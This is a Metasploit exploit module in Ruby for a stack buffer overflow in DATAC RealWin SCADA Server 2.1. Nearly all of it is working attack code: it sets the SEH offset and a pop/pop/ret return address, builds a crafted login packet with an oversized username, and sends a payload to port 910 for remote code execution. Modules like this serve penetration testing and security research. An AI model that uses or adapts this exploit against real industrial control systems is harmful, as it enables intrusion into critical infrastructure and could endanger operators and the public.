# $Id: realwin_on_fcs_login.rb 13007 2011-06-22 22:36:55Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;RealWin SCADA Server DATAC Login Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in DATAC Control
                International RealWin SCADA Server 2.1 (Build 6.0.10.10) or
                earlier.  By sending a specially crafted On_FC_CONNECT_FCS_LOGIN
                packet containing a long username, an attacker may be able to
                execute arbitrary code.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;, #discovery
                    &#039;MC&#039;,
                    &#039;B|H <bh[AT]bufferattack.com>&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13007 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/realwin_2-adv.txt&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.dataconline.com/software/realwin.php&#039; ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 450,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Universal&#039;,
                        {
                            &#039;Offset&#039;   => 392,         # Offset to SEH
                            &#039;Ret&#039;      => 0x40012540,  # pop/pop/ret @FlexMLang.dll
                        }
                    ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Mar 21 2011&#039;))
 
        register_options([Opt::RPORT(910)], self.class)
    end
 
    def exploit
        data =  [0x67542310].pack(&#039;V&#039;)
        data << [0x00000824].pack(&#039;V&#039;)
        data << [0x00110011].pack(&#039;V&#039;)
        data << "\x01\x00"
        data << rand_text_alpha_upper(target[&#039;Offset&#039;])
        data << generate_seh_payload(target.ret)
        data << rand_text_alpha_upper(17706 - payload.encoded.length)
        data << [0x451c3500].pack(&#039;V&#039;)
        data << [0x00000154].pack(&#039;V&#039;)
        data << [0x00020040].pack(&#039;V&#039;)
 
        connect
        print_status("Trying target #{target.name}...")
        sock.put(data)
        select(nil,nil,nil,0.5)
        handler
        disconnect
    end
 
end



